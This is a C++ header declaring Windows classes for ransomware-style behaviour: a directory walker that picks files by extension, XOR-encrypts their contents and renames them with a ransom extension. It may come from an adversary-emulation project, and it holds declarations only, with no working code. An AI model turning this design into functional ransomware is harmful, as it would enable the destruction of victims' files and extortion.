#pragma once


#include <Windows.h>
#include <Shlwapi.h>

#include <string>
#include <vector>
#include <memory>
#include <unordered_set>

#pragma comment(lib, "Shlwapi.lib")

namespace win {

	class EncryptData{
	public:
		bool EncryptXOR(char* buffer, size_t buffer_length, char key);
	};

	class DataEncryptedforImpact{
	public:
		DataEncryptedforImpact(): ext_List_({}) {};

	public:
		bool SetRansomExtension(std::vector<std::wstring>* ext_list);
		DWORD RansomeData(std::wstring_view target_path);
	private:
		std::wstring ChangeFilenameExtensionForEncrypt(std::wstring_view target_file_path);
		DWORD EncryptFileData(std::wstring_view target_file_path);
		std::wstring GetExtension(const std::wstring& file_name);
		std::wstring GetExtension2(const std::wstring& file_name);
		bool CheckFileExtension(const std::wstring& file_name, const std::vector<std::wstring>& extension_list);
		DWORD GetFileList(std::wstring_view path, std::vector<std::wstring>* text_files);

	private:
		std::vector<std::wstring> ext_List_;
	};




} //namespace win




